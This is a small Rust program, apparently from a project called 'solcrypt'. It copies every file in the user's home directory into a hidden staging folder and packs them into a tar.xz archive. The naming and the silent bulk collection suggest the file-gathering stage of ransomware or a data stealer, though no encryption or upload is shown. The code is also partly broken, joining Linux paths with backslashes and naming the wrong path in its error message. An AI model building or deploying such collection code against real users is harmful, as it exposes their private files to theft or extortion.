use std::{fs, path::Path};

fn main() {

    // Vars
    #[cfg(target_os = "windows")]
    let home = std::env::var("USERPROFILE").unwrap();
    #[cfg(target_os = "windows")]
    let dest = format!("{home}\\AppData\\Local\\SolDS\\home.tar.xz");
    #[cfg(target_os = "windows")]
    let dirpath = format!("{home}\\AppData\\Local\\SolDS\\");

    #[cfg(target_os = "linux")]
    let home = std::env::var("HOME").unwrap();
    #[cfg(target_os = "linux")]
    let dest: String = String::from("/tmp/solcrypt/home.tar.xz");
    #[cfg(target_os = "linux")]
    let dirpath = format!("/tmp/solcrypt");
    let homedirfiles = solcrypt::get_all_files(&home);
    
    // Create a directory containing every file the user has in their home directory
    match fs::create_dir(&dirpath) {
        Ok(dir) => dir,
        Err(e) => eprintln!("ERROR: {:?}", e),
    };

    for file in homedirfiles {
        let og_filepath = Path::new(&file);
        let filename = og_filepath.file_name().unwrap().to_str().unwrap();
        
        match fs::copy(&file, format!("{dirpath}\\{filename}")) {
            Ok(..) => {},
            Err(e) => { eprintln!("ERROR: {}, from: {}, to: {}", e, &file, format!("{dest}\\{filename}")) },
        }
    }
        
    dbg!("Compressing");
    solcrypt::compress_directory_to_tar_xz(dirpath.clone(), dest.clone()).unwrap();

}
